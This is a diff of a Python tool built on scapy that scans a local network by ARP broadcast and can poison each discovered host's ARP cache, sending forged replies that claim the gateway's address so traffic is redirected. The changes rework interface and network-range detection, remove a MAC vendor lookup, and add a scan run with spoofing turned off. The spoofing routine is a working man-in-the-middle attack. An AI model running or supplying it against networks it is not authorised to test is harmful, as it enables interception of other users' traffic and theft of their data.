@@ -1,11 +1,10 @@
 from ipaddress import IPv4Network
-from socket import gethostbyaddr
-from threading import Thread
-from time import time
 
 import scapy.all as scapy
-from mac_vendor_lookup import MacLookup
-from netifaces import AF_INET, gateways, ifaddresses
+from socket import gethostbyaddr
+from time import time
+from threading import Thread
+from netifaces import gateways, AF_INET, ifaddresses, interfaces
 
 
 class ArpSpoofing:
@@ -24,25 +23,21 @@ class ArpSpoofing:
         raise NotImplementedError
 
     @property
-    def __getRunningIface(self):
-        return str(self.sp.get_working_if())
+    def __getRunningIface(self) -> str:
+        return str(interfaces()[2])
 
     def __get_netmask_for_running_iface(self):
-        return ifaddresses(str(self.__getRunningIface)).get(2)[0].get('netmask')
+        return ifaddresses(self.__getRunningIface).get(2)[0].get('netmask')
 
     def __getGatewayAddress(self):
         gw = gateways().get('default' or None).get(AF_INET)[0]
         if gw:
             return gw
-    def GetVendorByMac(self,mac: str) -> str:
-        return MacLookup().lookup(mac)
+
     def __Get_NetWork_Range(self):
         cidr = self.__get_netmask_for_running_iface()
-        local_ip = self.__get_local_ip()
-        return str(IPv4Network(f"{local_ip}/{cidr}", strict=False))
-
-    def __get_local_ip(self):
-        return self.sp.get_if_addr(self.__getRunningIface)
+        gateway = self.__getGatewayAddress()
+        return IPv4Network(f"{gateway}/{cidr}", strict=False)
 
     def Spoofer(self, des_ip: str, des_mac: str, real_gateway: str) -> None:
         """
@@ -54,14 +49,14 @@ class ArpSpoofing:
         :param real_gateway: the real gateway address
         :return:
         """
-        packet = self.sp.ARP(
-            op=2, pdst=des_ip, hwdst=des_mac, psrc=real_gateway)
+        packet = self.sp.ARP(op=2, pdst=des_ip, hwdst=des_mac, psrc=real_gateway)
         self.sp.send(packet, verbose=False)
         print("Spoofed Successfully")
 
     def MakeArpRequest(self):
+        print(self.ip_range)
         if self.ip_range:
-            return self.sp.ARP(pdst=self.ip_range)
+            return self.sp.ARP(pdst=self.ip_range, op=1)
 
     def MakeEtherFrame(self):
         return self.sp.Ether(dst='ff:ff:ff:ff:ff:ff')
@@ -77,16 +72,14 @@ class ArpSpoofing:
         """
         start_time = time()
 
-        answered, un = self.sp.srp(
-            self.MakeArpBroadCast(), timeout=1, verbose=False)
-        print()
-        for element in answered:
+        answered, un = self.sp.srp(self.MakeArpBroadCast(), timeout=3, verbose=True)
+        print(answered)
+        for target in answered:
             if self.spoof:
-                Thread(target=self.Spoofer, args=(
-                    element[1].psrc, element[1].hwsrc, self.GatewayAddr)).start()
-            print(F"IP: {element[1].psrc} Mac: {element[1].hwsrc}, Vendor: {self.GetVendorByMac(element[1].hwsrc)}")
+                Thread(target=self.Spoofer, args=(target[1].psrc, target[1].hwsrc, self.GatewayAddr)).start()
+            print(F"IP: {target[1].psrc} Mac: {target[1].hwsrc}")
             try:
-                print(f"Hostname: {gethostbyaddr(element[1].psrc)[0]}")
+                print(f"Hostname: {gethostbyaddr(target[1].psrc)[0]}")
             except:
                 pass
             print('-' * 40)
@@ -95,3 +88,7 @@ class ArpSpoofing:
             f"\nNetwork Address: {self.__Get_NetWork_Range()}"
             f"\nTotal discovered devices: {len(answered)}"
             f"\nTaken Time: {round(time() - start_time, 2)}s")
+
+
+arp = ArpSpoofing(spoof=False)
+arp.scan()
